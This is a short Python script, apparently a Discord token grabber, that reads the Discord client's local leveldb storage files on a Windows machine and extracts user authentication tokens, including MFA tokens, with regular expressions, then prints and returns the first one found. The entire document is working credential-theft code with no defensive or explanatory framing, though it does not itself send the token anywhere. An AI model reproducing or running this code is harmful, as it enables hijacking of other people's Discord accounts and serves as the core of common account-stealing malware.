import os
from base64 import b64decode
from re import findall

def parseTokens():
    path = "C:\\Users\\User\\AppData\\Roaming\\Discord\\Local Storage\\leveldb"
    for filename in os.listdir(path):
        if not filename.endswith(".log") and not filename.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{filename}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for tokens in findall(regex, line):
                    print(f"{tokens}")
                    return tokens

parseTokens()
